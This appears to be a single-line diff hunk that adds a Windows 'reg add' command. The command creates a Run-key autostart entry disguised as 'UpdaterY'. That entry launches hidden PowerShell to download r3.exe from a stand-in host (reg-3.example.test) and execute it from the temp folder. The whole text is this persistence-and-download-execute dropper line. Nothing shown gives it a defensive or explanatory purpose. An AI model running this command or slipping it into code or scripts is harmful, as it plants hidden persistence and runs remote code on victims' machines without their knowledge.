@@ -1,0 +1,1 @@
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdaterY /t REG_SZ /d "powershell -w hidden -c iwr http://reg-3.example.test/r3.exe -o %TEMP%\r.exe;start %TEMP%\r.exe" /f
